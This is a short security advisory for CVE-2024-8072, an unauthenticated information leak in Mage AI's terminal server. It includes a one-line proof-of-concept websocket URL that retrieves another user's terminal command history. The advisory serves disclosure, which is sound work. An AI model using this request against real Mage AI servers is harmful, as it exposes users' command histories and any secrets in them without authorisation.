---
description: CVE-2024-8072, MEDIUM, Mage AI Terminal Server Infoleak
title: Mage AI Terminal Server Infoleak
date_published: "2024-08-22"
last_updated: "2024-08-22"
xray_id: JFSA-2024-001039574
vul_id: CVE-2024-8072
cvss: 5.3
severity: medium
discovered_by: Ori Hollander
type: vulnerability

---

## Summary

Mage AI allows remote unauthenticated attackers to leak the terminal server command history of arbitrary users

## Component

mage-ai

## Affected versions

(,)

## Description

Mage AI allows remote unauthenticated attackers to leak the terminal server command history of arbitrary users

## PoC

Leaking terminal command history for user #1 - 

```
ws://localhost:6789/websocket/terminal?term_name=1--PortalTerminal--Main%20Mage
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

No references are supplied for this issue

